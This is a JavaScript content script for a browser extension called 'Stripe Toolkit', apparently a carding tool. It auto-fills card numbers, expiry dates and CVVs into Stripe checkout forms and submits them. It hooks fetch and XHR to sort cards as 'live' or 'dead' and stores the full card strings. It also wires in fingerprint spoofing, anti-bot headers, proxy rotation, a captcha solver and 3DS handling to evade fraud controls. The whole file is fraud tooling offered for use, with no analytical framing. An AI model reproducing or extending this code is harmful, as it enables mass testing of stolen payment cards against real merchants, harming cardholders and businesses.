(function() {
    'use strict';

    let fingerprint = null;
    let antiBot = null;
    let sessionManager = null;
    let captchaSolver = null;
    let threeDSHandler = null;
    let paymentHandler = null;
    let currentSession = null;
    let isCheckoutPage = false;
    let cardFieldsDetected = false;

    const config = {
        autoApplyFingerprint: true,
        autoApplyAntiBot: true,
        verbose: true,
        autoCaptchaClick: true,
        autoFillEmail: true,
        autoFillName: true
    };
    
    let cardsTried = 0;
    let successCount = 0;
    let currentCard = null;

    const CARD_SELECTORS = {
        number: [
            'input[name="cardNumber"]',
            'input[data-elements-stable-field-name="cardNumber"]',
            'input[autocomplete="cc-number"]',
            'input[placeholder*="card number" i]',
            'input[placeholder*="1234" i]',
            'input[id*="cardNumber" i]',
            'input[id*="card-number" i]',
            'input[name="card_number"]',
            'input[name="ccnumber"]',
            'input[data-testid="card-number-input"]',
            '#card-number',
            '.card-number input',
            '[data-stripe="number"]'
        ],
        expiry: [
            'input[name="cardExpiry"]',
            'input[data-elements-stable-field-name="cardExpiry"]',
            'input[autocomplete="cc-exp"]',
            'input[placeholder*="MM" i]',
            'input[placeholder*="expir" i]',
            'input[id*="expiry" i]',
            'input[id*="exp-date" i]',
            'input[name="exp_date"]',
            'input[name="ccexp"]',
            '[data-stripe="exp"]'
        ],
        expMonth: [
            'input[name="cardExpiryMonth"]',
            'input[autocomplete="cc-exp-month"]',
            'select[name="exp_month"]',
            'select[id*="month" i]',
            'input[placeholder*="MM" i]:not([placeholder*="YY" i])'
        ],
        expYear: [
            'input[name="cardExpiryYear"]',
            'input[autocomplete="cc-exp-year"]',
            'select[name="exp_year"]',
            'select[id*="year" i]',
            'input[placeholder*="YY" i]:not([placeholder*="MM" i])'
        ],
        cvv: [
            'input[name="cardCvc"]',
            'input[data-elements-stable-field-name="cardCvc"]',
            'input[autocomplete="cc-csc"]',
            'input[placeholder*="CVC" i]',
            'input[placeholder*="CVV" i]',
            'input[placeholder*="security" i]',
            'input[id*="cvc" i]',
            'input[id*="cvv" i]',
            'input[name="cvc"]',
            'input[name="cvv"]',
            '[data-stripe="cvc"]'
        ],
        email: [
            'input[type="email"]',
            'input[name="email"]',
            'input[autocomplete="email"]',
            'input[placeholder*="email" i]'
        ],
        name: [
            'input[name="cardholderName"]',
            'input[name="name"]',
            'input[autocomplete="cc-name"]',
            'input[placeholder*="name on card" i]',
            'input[placeholder*="cardholder" i]'
        ]
    };

    function log(...args) {
        if (config.verbose) {
            console.log('[STRIPE-TOOLKIT]', ...args);
        }
    }

    function detectCheckoutPage() {
        const url = window.location.href;
        const html = document.documentElement.innerHTML;
        
        const isStripeCheckout = url.includes('checkout.stripe.com') || 
                                 url.includes('stripe.com/pay') ||
                                 url.includes('/checkout');
        
        const hasStripeElements = html.includes('stripe.com') ||
                                  html.includes('pk_live_') ||
                                  html.includes('pk_test_') ||
                                  document.querySelector('[data-stripe]') !== null;
        
        const hasCardFields = findCardFields().number !== null;
        
        isCheckoutPage = isStripeCheckout || hasStripeElements || hasCardFields;
        cardFieldsDetected = hasCardFields;
        
        log('Checkout detection:', { isCheckoutPage, cardFieldsDetected, url });
        
        return isCheckoutPage;
    }

    function findCardFields() {
        const fields = {
            number: null,
            expiry: null,
            expMonth: null,
            expYear: null,
            cvv: null,
            email: null,
            name: null
        };

        for (const [fieldType, selectors] of Object.entries(CARD_SELECTORS)) {
            for (const selector of selectors) {
                try {
                    const element = document.querySelector(selector);
                    if (element && isVisible(element)) {
                        fields[fieldType] = element;
                        break;
                    }
                } catch (e) {}
            }
        }

        const iframes = document.querySelectorAll('iframe');
        iframes.forEach(iframe => {
            try {
                if (iframe.src?.includes('stripe.com') || iframe.name?.includes('stripe')) {
                    log('Found Stripe iframe:', iframe.name || iframe.src);
                }
            } catch (e) {}
        });

        return fields;
    }

    function isVisible(element) {
        if (!element) return false;
        const style = window.getComputedStyle(element);
        return style.display !== 'none' && 
               style.visibility !== 'hidden' && 
               style.opacity !== '0' &&
               element.offsetParent !== null;
    }

    function fillCardDetails(card) {
        log('Filling card details...', card);
        
        const fields = findCardFields();
        let filled = false;

        if (fields.number) {
            simulateInput(fields.number, card.number);
            filled = true;
            log('Filled card number');
        }

        if (fields.expiry) {
            const expValue = `${card.expMonth}/${card.expYear.slice(-2)}`;
            simulateInput(fields.expiry, expValue);
            log('Filled expiry (combined)');
        } else {
            if (fields.expMonth) {
                if (fields.expMonth.tagName === 'SELECT') {
                    selectOption(fields.expMonth, card.expMonth);
                } else {
                    simulateInput(fields.expMonth, card.expMonth);
                }
                log('Filled exp month');
            }
            if (fields.expYear) {
                const year = card.expYear.length === 4 ? card.expYear : '20' + card.expYear;
                if (fields.expYear.tagName === 'SELECT') {
                    selectOption(fields.expYear, year);
                } else {
                    simulateInput(fields.expYear, year.slice(-2));
                }
                log('Filled exp year');
            }
        }

        if (fields.cvv) {
            simulateInput(fields.cvv, card.cvv);
            filled = true;
            log('Filled CVV');
        }

        tryFillStripeIframe(card);

        return filled;
    }

    function tryFillStripeIframe(card) {
        const iframes = document.querySelectorAll('iframe[name*="stripe"], iframe[src*="stripe"]');
        
        iframes.forEach(iframe => {
            try {
                const iframeDoc = iframe.contentDocument || iframe.contentWindow?.document;
                if (iframeDoc) {
                    const inputs = iframeDoc.querySelectorAll('input');
                    inputs.forEach(input => {
                        // Remove maxLength limits from iframe inputs
                        if (input.hasAttribute('maxlength')) {
                            input.removeAttribute('maxlength');
                        }
                        if (input.hasAttribute('maxLength')) {
                            input.removeAttribute('maxLength');
                        }
                        
                        const name = input.name?.toLowerCase() || '';
                        const placeholder = input.placeholder?.toLowerCase() || '';
                        
                        if (name.includes('cardnumber') || placeholder.includes('card number')) {
                            simulateInput(input, card.number);
                        } else if (name.includes('exp') || placeholder.includes('mm')) {
                            simulateInput(input, `${card.expMonth}/${card.expYear.slice(-2)}`);
                        } else if (name.includes('cvc') || placeholder.includes('cvc')) {
                            simulateInput(input, card.cvv);
                        }
                    });
                }
            } catch (e) {
                log('Cannot access iframe (cross-origin)');
            }
        });
    }

    function simulateInput(element, value) {
        if (!element) return;
        
        // Remove maxLength limit to allow unlimited card numbers
        if (element.hasAttribute('maxlength')) {
            element.removeAttribute('maxlength');
            log('Removed maxLength limit from input');
        }
        if (element.hasAttribute('maxLength')) {
            element.removeAttribute('maxLength');
        }
        
        // Direct paste method - no keyboard simulation
        element.focus();
        element.dispatchEvent(new Event('focus', { bubbles: true }));
        
        // Set value directly
        const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        nativeInputValueSetter.call(element, value);
        
        // Trigger events for React/Vue/Angular frameworks
        element.dispatchEvent(new Event('input', { bubbles: true }));
        element.dispatchEvent(new Event('change', { bubbles: true }));
        
        // For Stripe Elements
        const inputEvent = new InputEvent('input', {
            bubbles: true,
            cancelable: true,
            inputType: 'insertText',
            data: value
        });
        element.dispatchEvent(inputEvent);
        
        element.dispatchEvent(new Event('blur', { bubbles: true }));
        
        log('Direct paste:', value.substring(0, 4) + '****');
    }

    function selectOption(selectElement, value) {
        const options = selectElement.options;
        for (let i = 0; i < options.length; i++) {
            if (options[i].value === value || 
                options[i].text === value ||
                options[i].value.includes(value) ||
                options[i].text.includes(value)) {
                selectElement.selectedIndex = i;
                selectElement.dispatchEvent(new Event('change', { bubbles: true }));
                return true;
            }
        }
        return false;
    }

    function clickSubmit() {
        const submitSelectors = [
            'button[type="submit"]',
            '.SubmitButton',
            '[data-testid="hosted-payment-submit-button"]',
            'button[class*="submit" i]',
            'button[class*="pay" i]',
            'input[type="submit"]',
            'button:contains("Pay")',
            'button:contains("Subscribe")',
            'button:contains("Complete")',
            '.btn-primary[type="submit"]'
        ];

        for (const selector of submitSelectors) {
            try {
                const button = document.querySelector(selector);
                if (button && isVisible(button) && !button.disabled) {
                    log('Clicking submit button:', selector);
                    button.click();
                    return true;
                }
            } catch (e) {}
        }

        const buttons = document.querySelectorAll('button');
        for (const button of buttons) {
            const text = button.textContent?.toLowerCase() || '';
            if ((text.includes('pay') || text.includes('submit') || text.includes('subscribe') || text.includes('complete')) &&
                isVisible(button) && !button.disabled) {
                log('Clicking button by text:', text);
                button.click();
                return true;
            }
        }

        log('Submit button not found');
        return false;
    }

    function extractCheckoutInfo() {
        const info = {
            url: window.location.href,
            sessionId: null,
            publicKey: null,
            amount: null,
            currency: null,
            merchantName: null,
            productName: null,
            customerEmail: null
        };

        const sessionMatch = window.location.href.match(/cs_[a-zA-Z0-9_]+/);
        if (sessionMatch) {
            info.sessionId = sessionMatch[0];
        }

        const html = document.documentElement.innerHTML;

        const pkMatch = html.match(/pk_live_[a-zA-Z0-9]+/) || html.match(/pk_test_[a-zA-Z0-9]+/);
        if (pkMatch) {
            info.publicKey = pkMatch[0];
        }

        const amountSelectors = [
            '[data-testid="total-amount"]',
            '.CheckoutPaymentForm-total',
            '.total-amount',
            '.amount',
            '[class*="total" i]',
            '[class*="price" i]'
        ];
        
        for (const selector of amountSelectors) {
            const el = document.querySelector(selector);
            if (el) {
                info.amount = el.textContent?.trim();
                break;
            }
        }

        const merchantSelectors = [
            '[data-testid="merchant-name"]',
            '.merchant-name',
            '.Header-businessName',
            '[class*="merchant" i]',
            '[class*="business" i]'
        ];
        
        for (const selector of merchantSelectors) {
            const el = document.querySelector(selector);
            if (el) {
                info.merchantName = el.textContent?.trim();
                break;
            }
        }

        const emailInput = document.querySelector('input[type="email"]');
        if (emailInput) {
            info.customerEmail = emailInput.value;
        }

        return info;
    }

    function setupResponseMonitor() {
        const originalFetch = window.fetch;
        window.fetch = async function(...args) {
            const response = await originalFetch.apply(this, args);
            const clone = response.clone();
            
            try {
                const url = args[0]?.url || args[0];
                if (typeof url === 'string' && url.includes('stripe.com')) {
                    const data = await clone.json();
                    handleStripeResponse(url, data, response.status);
                }
            } catch (e) {}

            return response;
        };

        const originalXHR = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            this._url = url;
            this._method = method;
            return originalXHR.apply(this, arguments);
        };

        const originalSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(body) {
            this.addEventListener('load', function() {
                if (this._url?.includes('stripe.com')) {
                    try {
                        const data = JSON.parse(this.responseText);
                        handleStripeResponse(this._url, data, this.status);
                    } catch (e) {}
                }
            });
            return originalSend.apply(this, arguments);
        };

        log('Response monitor setup complete');
    }

    function handleStripeResponse(url, data, status) {
        log('Stripe response:', url, status, data);

        const result = {
            url: url,
            status: status,
            success: false,
            error: null,
            declineCode: null,
            requires3DS: false,
            card: currentCard,
            rawResponse: data,
            timestamp: new Date().toISOString()
        };

        // Check for errors
        if (data.error) {
            result.error = data.error.message || data.error.code;
            result.declineCode = data.error.decline_code || data.error.code;
            log('Error response:', result.error, result.declineCode);
        }

        // Check for success - multiple patterns
        const isSuccess = 
            data.payment_intent?.status === 'succeeded' || 
            data.status === 'complete' ||
            data.status === 'succeeded' ||
            data.payment_method?.id ||
            data.charge?.status === 'succeeded' ||
            data.source?.status === 'chargeable' ||
            (data.id && data.object === 'payment_intent' && data.status === 'succeeded');
            
        if (isSuccess) {
            result.success = true;
            result.status = 'live';
            successCount++;
            log('Payment succeeded!');
            const cardStr = currentCard ? `${currentCard.number}|${currentCard.expMonth}|${currentCard.expYear}|${currentCard.cvv}` : '';
            showToast('🎉 LIVE CARD FOUND!', 'success', cardStr);
            updatePanelStats(cardsTried, successCount);
            
            // Store live card
            chrome.storage.local.get(['liveCards'], (stored) => {
                const liveCards = stored.liveCards || [];
                liveCards.push({ card: cardStr, timestamp: Date.now(), url: window.location.href });
                chrome.storage.local.set({ liveCards });
            });
        }

        // Check for decline - comprehensive patterns
        const declineCodes = [
            'card_declined', 'insufficient_funds', 'lost_card', 'stolen_card',
            'expired_card', 'incorrect_cvc', 'processing_error', 'incorrect_number',
            'invalid_expiry_month', 'invalid_expiry_year', 'invalid_cvc',
            'do_not_honor', 'transaction_not_allowed', 'pickup_card',
            'fraudulent', 'generic_decline', 'call_issuer', 'restricted_card'
        ];
        
        const isDeclined = 
            data.error?.code === 'card_declined' || 
            data.error?.type === 'card_error' ||
            data.error?.decline_code ||
            declineCodes.includes(data.error?.code) ||
            declineCodes.includes(data.error?.decline_code) ||
            (data.last_payment_error?.code && declineCodes.includes(data.last_payment_error.code));
            
        if (isDeclined && !result.success) {
            result.status = 'dead';
            cardsTried++;
            const declineReason = result.declineCode || result.error || 'Unknown';
            log('Card declined:', declineReason);
            showToast('❌ Card Declined', 'error', `Reason: ${declineReason}`);
            updatePanelStats(cardsTried, successCount);
            
            // Store dead card
            chrome.storage.local.get(['deadCards'], (stored) => {
                const deadCards = stored.deadCards || [];
                const cardStr = currentCard ? `${currentCard.number}|${currentCard.expMonth}|${currentCard.expYear}|${currentCard.cvv}` : '';
                deadCards.push({ card: cardStr, reason: declineReason, timestamp: Date.now() });
                chrome.storage.local.set({ deadCards });
            });
        }

        // Check for 3DS
        if (data.payment_intent?.status === 'requires_action' ||
            data.next_action?.type === 'use_stripe_sdk' ||
            data.next_action?.type === 'redirect_to_url' ||
            data.status === 'requires_action' ||
            data.requires_action) {
            result.requires3DS = true;
            log('3DS required');
            showToast('🔐 3DS Verification Required', 'info', 'Waiting for verification...');
        }
        
        // Check for authentication failure
        if (data.error?.code === 'authentication_required' ||
            data.error?.code === 'authentication_failure' ||
            data.last_payment_error?.code === 'authentication_required') {
            result.status = 'dead';
            result.declineCode = 'authentication_failure';
            cardsTried++;
            showToast('🔒 Authentication Failed', 'error', 'Card requires additional verification');
            updatePanelStats(cardsTried, successCount);
        }
        
        // Check for rate limiting
        if (data.error?.code === 'rate_limit' || status === 429) {
            result.status = 'rate_limited';
            showToast('⚠️ Rate Limited', 'error', 'Too many requests, waiting...');
        }

        notifyPopup('cardResult', { result, cardsTried, successCount });
        
        // Also check page for visible error messages
        setTimeout(checkPageForErrors, 500);
    }
    
    function checkPageForErrors() {
        const errorSelectors = [
            '.StripeError',
            '.error-message',
            '[data-testid="error-message"]',
            '.payment-error',
            '.decline-message',
            '.alert-danger',
            '.error'
        ];
        
        for (const selector of errorSelectors) {
            const el = document.querySelector(selector);
            if (el && el.textContent) {
                const text = el.textContent.trim();
                if (text.includes('declined') || text.includes('error') || text.includes('failed')) {
                    log('Page error detected:', text);
                    notifyPopup('pageError', { message: text });
                }
            }
        }
        
        // Check for common decline text patterns
        const bodyText = document.body.innerText.toLowerCase();
        const declinePatterns = [
            'your card has been declined',
            'card was declined',
            'payment failed',
            'transaction declined',
            'insufficient funds',
            'card number is invalid',
            'security code is incorrect'
        ];
        
        for (const pattern of declinePatterns) {
            if (bodyText.includes(pattern)) {
                log('Decline text found on page:', pattern);
                showToast('❌ Decline Detected', 'error', pattern);
                notifyPopup('pageDecline', { message: pattern });
                break;
            }
        }
    }

    function showNotification(message, type = 'info') {
        const existing = document.querySelector('.stripe-toolkit-notification');
        if (existing) existing.remove();

        const notification = document.createElement('div');
        notification.className = `stripe-toolkit-notification ${type}`;
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 8px;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            font-size: 14px;
            z-index: 999999;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            animation: slideIn 0.3s ease;
            background: ${type === 'success' ? '#22c55e' : type === 'error' ? '#ef4444' : type === 'warning' ? '#f59e0b' : '#3b82f6'};
        `;
        notification.textContent = message;

        document.body.appendChild(notification);

        setTimeout(() => {
            notification.style.opacity = '0';
            notification.style.transform = 'translateX(100%)';
            setTimeout(() => notification.remove(), 300);
        }, 4000);
    }

    function notifyPopup(type, data) {
        try {
            chrome.runtime.sendMessage({
                type: type,
                ...data,
                url: window.location.href,
                timestamp: Date.now()
            });
        } catch (e) {}
    }
    
    function saveCheckoutLog(checkoutInfo) {
        chrome.storage.local.get(['checkoutLogs'], (data) => {
            const checkoutLogs = data.checkoutLogs || [];
            const logEntry = {
                ...checkoutInfo,
                timestamp: Date.now(),
                detectedAt: new Date().toISOString()
            };
            checkoutLogs.unshift(logEntry); // Add to beginning
            // Keep only last 50 checkout logs
            if (checkoutLogs.length > 50) {
                checkoutLogs.splice(50);
            }
            chrome.storage.local.set({ checkoutLogs });
            log('Checkout log saved:', logEntry);
        });
    }

    function initializeModules() {
        log('Initializing Stripe Toolkit...');

        if (typeof BrowserFingerprint !== 'undefined') {
            fingerprint = new BrowserFingerprint();
            fingerprint.generateFingerprint();
            if (config.autoApplyFingerprint) {
                fingerprint.applyFingerprint();
            }
            log('Fingerprint module initialized');
        }

        if (typeof AntiBotHeaders !== 'undefined') {
            antiBot = new AntiBotHeaders({ verbose: config.verbose });
            if (config.autoApplyAntiBot) {
                antiBot.applyAntiBotMeasures();
            }
            log('Anti-bot module initialized');
        }

        if (typeof SessionManager !== 'undefined') {
            sessionManager = new SessionManager();
            currentSession = sessionManager.getOrCreateSession(window.location.href);
            log('Session manager initialized');
        }

        if (typeof CaptchaSolver !== 'undefined') {
            captchaSolver = new CaptchaSolver({ verbose: config.verbose });
            log('Captcha solver initialized');
        }

        if (typeof ThreeDSHandler !== 'undefined') {
            threeDSHandler = new ThreeDSHandler({ verbose: config.verbose });
            log('3DS handler initialized');
        }

        if (typeof PaymentHandler !== 'undefined') {
            paymentHandler = new PaymentHandler({ verbose: config.verbose });
            log('Payment handler initialized');
        }

        log('All modules initialized');
    }

    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
        log('Received message:', message.action);

        switch (message.action) {
            case 'getInfo':
                sendResponse(extractCheckoutInfo());
                break;

            case 'fillCard':
                const filled = fillCardDetails(message.card);
                sendResponse({ success: filled });
                break;

            case 'submit':
                const submitted = clickSubmit();
                sendResponse({ success: submitted });
                break;

            case 'getSession':
                sendResponse(currentSession);
                break;

            case 'getFingerprint':
                sendResponse(fingerprint?.getFingerprint?.() || null);
                break;

            case 'getHeaders':
                sendResponse(antiBot?.getHeaders?.() || null);
                break;

            case 'getCookies':
                sendResponse(antiBot?.getCookies?.() || null);
                break;

            case 'isCheckoutPage':
                sendResponse({ isCheckout: detectCheckoutPage() });
                break;

            case 'getCardFields':
                const fields = findCardFields();
                sendResponse({
                    hasFields: fields.number !== null || fields.cvv !== null,
                    fields: Object.keys(fields).filter(k => fields[k] !== null)
                });
                break;
                
            case 'sessionRefreshed':
                log('Session refreshed:', message.headers, message.proxy);
                updatePanelProxy(message.proxy);
                showToast('Session Refreshed', 'info', message.proxy ? `Proxy: ${message.proxy}` : 'New headers applied');
                sendResponse({ success: true });
                break;
                
            case 'allCardsProcessed':
                log('All cards processed');
                updatePanelStatus('Complete', false);
                showToast('All Cards Processed', 'info', `Tried: ${cardsTried}, Live: ${successCount}`);
                sendResponse({ success: true });
                break;
                
            case 'playSound':
                if (message.type === 'live') {
                    const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2teleQYAJI/c8qCHHgAGjNvxpYwdAAKL3PKkjR0AAYvc8qWNHQABi9zypY0dAAGL3PKljR0AAYvc8qWNHQABi9zypY0dAAGL3PKljR0AAYvc8qWNHQ==');
                    audio.play().catch(() => {});
                }
                sendResponse({ success: true });
                break;

            default:
                sendResponse({ error: 'Unknown action' });
        }

        return true;
    });

    function init() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', onReady);
        } else {
            onReady();
        }
    }

    function createFloatingPanel() {
        const existing = document.getElementById('stripe-toolkit-panel');
        if (existing) return;
        
        const checkoutInfo = extractCheckoutInfo();
        
        const panel = document.createElement('div');
        panel.id = 'stripe-toolkit-panel';
        panel.innerHTML = `
            <div class="stp-header">
                <span class="stp-title">⚡ Stripe Toolkit</span>
                <span class="stp-version">v3.0</span>
                <button id="stp-minimize" class="stp-minimize">−</button>
            </div>
            <div class="stp-checkout-info">
                <div class="stp-info-row">
                    <span class="stp-info-label">Merchant:</span>
                    <span id="stp-merchant" class="stp-info-value">${checkoutInfo.merchantName || 'Unknown'}</span>
                </div>
                <div class="stp-info-row">
                    <span class="stp-info-label">Amount:</span>
                    <span id="stp-amount" class="stp-info-value">${checkoutInfo.amount || 'N/A'} ${checkoutInfo.currency || ''}</span>
                </div>
                <div class="stp-info-row">
                    <span class="stp-info-label">Session:</span>
                    <span id="stp-session" class="stp-info-value">${checkoutInfo.sessionId ? checkoutInfo.sessionId.substring(0, 15) + '...' : 'N/A'}</span>
                </div>
            </div>
            <div class="stp-divider"></div>
            <div class="stp-status">
                <span class="stp-dot active"></span>
                <span id="stp-status-text">Active - Monitoring</span>
            </div>
            <div class="stp-current-card">
                <span class="stp-card-label">Current Card:</span>
                <span id="stp-current-card" class="stp-card-value">None</span>
            </div>
            <div class="stp-stats">
                <div class="stp-stat">
                    <span class="stp-stat-label">Tried</span>
                    <span id="stp-cards-tried" class="stp-stat-value">0</span>
                </div>
                <div class="stp-stat">
                    <span class="stp-stat-label">Live</span>
                    <span id="stp-success" class="stp-stat-value success">0</span>
                </div>
                <div class="stp-stat">
                    <span class="stp-stat-label">Dead</span>
                    <span id="stp-dead" class="stp-stat-value dead">0</span>
                </div>
            </div>
            <div class="stp-result-display">
                <div id="stp-last-result" class="stp-result">Waiting for result...</div>
            </div>
            <div class="stp-proxy-info">
                <span class="stp-proxy-label">Proxy:</span>
                <span id="stp-proxy" class="stp-proxy-value">None</span>
            </div>
            <div class="stp-controls">
                <button id="stp-start" class="stp-btn start">▶ Start</button>
                <button id="stp-stop" class="stp-btn stop">■ Stop</button>
                <button id="stp-refresh" class="stp-btn refresh">↻</button>
                <button id="stp-settings" class="stp-btn settings">⚙</button>
            </div>
        `;
        panel.style.cssText = `
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            border: 2px solid rgba(99, 91, 255, 0.6);
            border-radius: 16px;
            padding: 20px;
            min-width: 320px;
            max-width: 380px;
            z-index: 999998;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            box-shadow: 0 8px 32px rgba(99, 91, 255, 0.4), 0 0 60px rgba(99, 91, 255, 0.2);
            color: white;
            backdrop-filter: blur(10px);
        `;
        
        const style = document.createElement('style');
        style.textContent = `
            #stripe-toolkit-panel .stp-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; gap: 10px; }
            #stripe-toolkit-panel .stp-title { font-weight: 700; font-size: 14px; color: #a5a5ff; }
            #stripe-toolkit-panel .stp-version { font-size: 10px; color: #6b7280; background: rgba(99,91,255,0.2); padding: 2px 6px; border-radius: 4px; }
            #stripe-toolkit-panel .stp-minimize { background: none; border: none; color: #9ca3af; cursor: pointer; font-size: 16px; padding: 0 5px; }
            #stripe-toolkit-panel .stp-checkout-info { background: rgba(0,0,0,0.2); border-radius: 8px; padding: 10px; margin-bottom: 10px; }
            #stripe-toolkit-panel .stp-info-row { display: flex; justify-content: space-between; margin-bottom: 4px; }
            #stripe-toolkit-panel .stp-info-label { font-size: 11px; color: #9ca3af; }
            #stripe-toolkit-panel .stp-info-value { font-size: 11px; color: #e0e0e0; font-weight: 500; max-width: 150px; overflow: hidden; text-overflow: ellipsis; }
            #stripe-toolkit-panel .stp-divider { height: 1px; background: rgba(99,91,255,0.3); margin: 10px 0; }
            #stripe-toolkit-panel .stp-status { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
            #stripe-toolkit-panel .stp-dot { width: 8px; height: 8px; border-radius: 50%; background: #22c55e; animation: pulse 1.5s infinite; }
            #stripe-toolkit-panel .stp-dot.inactive { background: #ef4444; animation: none; }
            #stripe-toolkit-panel #stp-status-text { font-size: 12px; color: #22c55e; }
            #stripe-toolkit-panel .stp-current-card { background: rgba(99,91,255,0.1); border-radius: 6px; padding: 8px; margin-bottom: 10px; }
            #stripe-toolkit-panel .stp-card-label { font-size: 10px; color: #9ca3af; display: block; margin-bottom: 2px; }
            #stripe-toolkit-panel .stp-card-value { font-size: 12px; color: #fff; font-family: monospace; word-break: break-all; }
            #stripe-toolkit-panel .stp-stats { display: flex; gap: 15px; margin-bottom: 10px; justify-content: center; }
            #stripe-toolkit-panel .stp-stat { text-align: center; flex: 1; }
            #stripe-toolkit-panel .stp-stat-label { display: block; font-size: 10px; color: #9ca3af; }
            #stripe-toolkit-panel .stp-stat-value { display: block; font-size: 20px; font-weight: 700; color: #e0e0e0; }
            #stripe-toolkit-panel .stp-stat-value.success { color: #22c55e; }
            #stripe-toolkit-panel .stp-stat-value.dead { color: #ef4444; }
            #stripe-toolkit-panel .stp-result-display { background: rgba(0,0,0,0.3); border-radius: 6px; padding: 8px; margin-bottom: 10px; }
            #stripe-toolkit-panel .stp-result { font-size: 11px; color: #9ca3af; text-align: center; }
            #stripe-toolkit-panel .stp-result.live { color: #22c55e; font-weight: bold; }
            #stripe-toolkit-panel .stp-result.dead { color: #ef4444; }
            #stripe-toolkit-panel .stp-proxy-info { display: flex; justify-content: space-between; margin-bottom: 10px; padding: 6px 8px; background: rgba(0,0,0,0.2); border-radius: 4px; }
            #stripe-toolkit-panel .stp-proxy-label { font-size: 10px; color: #9ca3af; }
            #stripe-toolkit-panel .stp-proxy-value { font-size: 10px; color: #f59e0b; font-family: monospace; }
            #stripe-toolkit-panel .stp-controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px; }
            #stripe-toolkit-panel .stp-btn { padding: 14px 18px; border: none; border-radius: 10px; cursor: pointer; font-size: 14px; font-weight: 600; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.3); }
            #stripe-toolkit-panel .stp-btn.start { background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: white; grid-column: 1 / 2; }
            #stripe-toolkit-panel .stp-btn.stop { background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); color: white; grid-column: 2 / 3; }
            #stripe-toolkit-panel .stp-btn.refresh { background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); color: white; }
            #stripe-toolkit-panel .stp-btn.settings { background: linear-gradient(135deg, #635bff 0%, #4f46e5 100%); color: white; }
            #stripe-toolkit-panel .stp-btn:hover { opacity: 0.95; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.4); }
            #stripe-toolkit-panel .stp-btn:active { transform: translateY(0); box-shadow: 0 2px 6px rgba(0,0,0,0.3); }
            #stripe-toolkit-panel .stp-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
            @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        `;
        document.head.appendChild(style);
        document.body.appendChild(panel);
        
        // Event listeners
        document.getElementById('stp-settings')?.addEventListener('click', () => {
            chrome.runtime.sendMessage({ type: 'openSettings' });
        });
        
        document.getElementById('stp-start')?.addEventListener('click', () => {
            chrome.runtime.sendMessage({ type: 'startProcessing' });
            updatePanelStatus('Processing...', true);
        });
        
        document.getElementById('stp-stop')?.addEventListener('click', () => {
            chrome.runtime.sendMessage({ type: 'stopProcessing' });
            updatePanelStatus('Stopped', false);
        });
        
        document.getElementById('stp-refresh')?.addEventListener('click', () => {
            chrome.runtime.sendMessage({ type: 'refreshSession' });
            showToast('Session Refreshed', 'info', 'New headers and cookies applied');
        });
        
        document.getElementById('stp-minimize')?.addEventListener('click', () => {
            const panel = document.getElementById('stripe-toolkit-panel');
            panel.classList.toggle('minimized');
        });
        
        log('Floating panel created');
    }
    
    function updatePanelStatus(text, active) {
        const statusText = document.getElementById('stp-status-text');
        const dot = document.querySelector('#stripe-toolkit-panel .stp-dot');
        if (statusText) statusText.textContent = text;
        if (dot) {
            dot.classList.toggle('active', active);
            dot.classList.toggle('inactive', !active);
        }
    }
    
    function updatePanelCurrentCard(cardStr) {
        const el = document.getElementById('stp-current-card');
        if (el) el.textContent = cardStr || 'None';
    }
    
    function updatePanelResult(result, isLive) {
        const el = document.getElementById('stp-last-result');
        if (el) {
            el.textContent = result;
            el.className = 'stp-result ' + (isLive ? 'live' : 'dead');
        }
    }
    
    function updatePanelProxy(proxy) {
        const el = document.getElementById('stp-proxy');
        if (el) el.textContent = proxy || 'None';
    }
    
    function createDetectionBadge() {
        const existing = document.getElementById('stripe-toolkit-badge');
        if (existing) return;
        
        const badge = document.createElement('div');
        badge.id = 'stripe-toolkit-badge';
        badge.innerHTML = '2D Checkout Detected ✓';
        badge.style.cssText = `
            position: fixed;
            top: 10px;
            left: 10px;
            background: linear-gradient(135deg, #22c55e, #16a34a);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            font-size: 12px;
            font-weight: 600;
            z-index: 999997;
            box-shadow: 0 2px 10px rgba(34, 197, 94, 0.4);
        `;
        document.body.appendChild(badge);
        log('Detection badge created');
    }
    
    function showToast(message, type = 'info', details = '') {
        const container = document.getElementById('stripe-toolkit-toasts') || createToastContainer();
        
        const toast = document.createElement('div');
        toast.className = `stp-toast ${type}`;
        toast.innerHTML = `
            <div class="stp-toast-icon">${type === 'success' ? '✓' : type === 'error' ? '✗' : 'ℹ'}</div>
            <div class="stp-toast-content">
                <div class="stp-toast-title">${type.toUpperCase()}</div>
                <div class="stp-toast-message">${message}</div>
                ${details ? `<div class="stp-toast-details">${details}</div>` : ''}
            </div>
            <button class="stp-toast-close">×</button>
        `;
        
        container.appendChild(toast);
        
        toast.querySelector('.stp-toast-close').addEventListener('click', () => toast.remove());
        setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 4000);
    }
